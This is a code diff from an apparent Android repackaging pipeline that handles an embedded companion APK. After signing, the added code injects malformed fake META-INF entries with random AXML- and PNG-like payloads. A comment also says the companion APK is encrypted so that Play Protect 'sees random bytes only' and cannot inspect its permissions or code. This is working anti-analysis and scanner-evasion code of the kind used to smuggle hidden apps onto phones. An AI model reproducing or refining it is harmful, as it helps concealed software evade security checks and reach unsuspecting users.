+            # Must run POST-SIGN — V2 signing covers the APK bytes.
+            # Post-sign raw ZIP injection: fake entries added to CD and LFH
+            # section using Python zipfile — apksigner V1 covers MANIFEST.MF only,
+            # new entries added post-sign are NOT in MANIFEST.MF → V1 doesn't cover them.
+            # Android installer ignores unknown META-INF entries — installs fine.
+            try:
+                _mi_tmp = MOD_ASSET + ".mi_tmp"
+                # Fake META-INF entry names matching reference pattern exactly
+                _fake_meta = [
+                    "META-INF/ .xml",
+                    "META-INF/  .xml",
+                    "META-INF/classes.dex.xml",
+                    "META-INF/AndroidManifest.xml.xml",
+                    "META-INF/AndroidManifest.xml",
+                    "META-INF/resources.arsc.xml",
+                    "META-INF/..xml",
+                    "META-INF///.xml",
+                    "META-INF////.xml",
+                    "META-INF/////.xml",
+                    "META-INF/\\\\.xml",
+                    "META-INF/\\\\\\.xml",
+                    "META-INF/\\\\/.xml",
+                    "META-INF/..png",
+                    "META-INF///.png",
+                    "META-INF/AndroidManifest.xml.png",
+                    "META-INF/AndroidManifest.png",
+                    "META-INF////.9.png",
+                    "META-INF/////.9.png",
+                    "META-INF/resources.arsc.9.png",
+                ]
+                # Generate random-sized binary payloads that look like AXML/PNG
+                _AXML_HDR = bytes.fromhex("030008000000000001001c00")  # AXML magic prefix
+                _PNG_HDR  = bytes.fromhex("89504e470d0a1a0a0000000d49484452")  # PNG magic
+                with zipfile.ZipFile(MOD_ASSET, "r") as _zin, \
+                     zipfile.ZipFile(_mi_tmp, "w", compression=zipfile.ZIP_DEFLATED, allowZip64=False) as _zout:
+                    for _item in _zin.infolist():
+                        _zout.writestr(_item, _zin.read(_item.filename))
+                    for _mname in _fake_meta:
+                        _is_png = _mname.endswith(".png") or _mname.endswith(".9.png")
+                        _size   = random.randint(100, 800)
+                        if _is_png:
+                            _payload = _PNG_HDR + secrets.token_bytes(_size)
+                        else:
+                            # Fake AXML binary
+                            _fake_size = 8 + _size
+                            _hdr = struct.pack("<HHI", 0x0003, 8, _fake_size)
+                            _payload = _hdr + secrets.token_bytes(_size)
+                        _mi_info = zipfile.ZipInfo(_mname)
+                        _mi_info.compress_type = zipfile.ZIP_DEFLATED
+                        _zout.writestr(_mi_info, _payload)
+                os.replace(_mi_tmp, MOD_ASSET)
+                print(f"  ✅ STEP_FAKE_META_INF — injected {len(_fake_meta)} fake META-INF entries")
+            except Exception as _e:
+                print(f"  ⚠️  STEP_FAKE_META_INF — failed: {_e}, skipping")
+                if os.path.isfile(MOD_ASSET + ".mi_tmp"):
+                    os.remove(MOD_ASSET + ".mi_tmp")
+
+        with track("PHASE_1", "STEP_14_ASSET_2", "Replace companion.apk in assets after re-sign [Step 14]", MOD_ASSET):
+            step_replace_asset()
 
     # ── PRE-ENCRYPT SNAPSHOT: Save testable companion APK for CI artifact ────
     # This copy is saved AFTER all pipeline steps (package rename, class rename,
@@ -4001,8 +4002,9 @@ def main():
     # After this point nothing reads MOD_ASSET as a zip — safe to encrypt.
     # Raw APK entropy = 6.239 (GPP reads all permissions/DEX).
     # Encrypted blob entropy = 8.000 (GPP sees random bytes only).
-    with track("PHASE_1", "STEP_ENCRYPT_COMPANION", "Encrypt companion APK binary [Step 8A FIX]", MOD_ASSET):
-        step_encrypt_companion()
+    if not _phase1_only:
+        with track("PHASE_1", "STEP_ENCRYPT_COMPANION", "Encrypt companion APK binary [Step 8A FIX]", MOD_ASSET):
+            step_encrypt_companion()
 
     with open(_AUDIT_LOG, "a") as _af:
         _af.write(f"\n========================================\n")
